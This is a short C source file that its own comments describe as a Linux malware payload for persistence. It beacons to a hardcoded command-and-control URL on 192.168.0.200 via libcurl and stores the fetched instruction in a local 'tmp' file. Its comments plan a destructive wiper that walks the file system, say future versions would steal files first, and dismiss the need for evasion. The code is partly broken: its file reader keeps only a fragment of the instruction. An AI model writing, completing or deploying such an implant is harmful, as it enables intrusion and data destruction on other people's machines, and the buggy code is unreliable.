#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

/* Compilation: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast
 * sudo apt install libcurl4-openssl-dev
 * gcc main.c -o main -lcurl
 *
*/
/* 
 * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
 * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
 * Functionality to copy files before wiping them will be a nice addition at some point in the future.
 * 
 * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
 * */

// Prototypes:

char * readFile(char * fileName);
int takeControlInstruction(void); 

// Globals:

char * CADDRESS = "http://192.168.0.200:5678/instruction.txt";

// Main function:

int main(int argc, char * argv[]) {
	
	takeControlInstruction();

	return 0;
}

// Function definitions:

int takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
	CURL *curl;
	CURLcode res;

	freopen("tmp", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later

	curl = curl_easy_init();									// Initializing the structure needed to make requests
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, CADDRESS);		// Setting the server
		// curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Proxy server can be specified here
		res = curl_easy_perform(curl);								// Make the request
		if (res != CURLE_OK) {									// Handling errors
		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
		}
		curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
	}
	
	freopen("/dev/tty", "w", stdout);		// Cleaning up output redirection; This is Linux specific

	char * instruction = readFile("tmp");
	printf("%s", instruction);

	return 0;
}

char * readFile(char * fileName) {
	FILE * file = fopen(fileName, "r");
	if (file == NULL) {
		return "FAILED";
	}
	char * contents = malloc(20);
	while (fgets(contents, sizeof(contents), file)) {}

	fclose(file);

	return contents;
}
